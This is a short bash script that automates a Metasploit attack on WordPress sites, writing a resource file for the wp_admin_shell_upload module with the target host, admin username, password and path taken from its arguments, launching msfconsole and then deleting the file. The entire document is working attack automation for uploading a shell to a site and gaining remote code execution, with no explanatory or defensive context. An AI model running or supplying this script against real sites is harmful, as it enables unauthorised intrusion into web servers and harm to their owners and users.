#!/bin/bash
echo """
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS $1
set USERNAME $2
set PASSWORD $3
set targeturi /$4
exploit
""" >>wp-shell.rc
msfconsole -r wp-shell.rc
rm wp-shell.rc

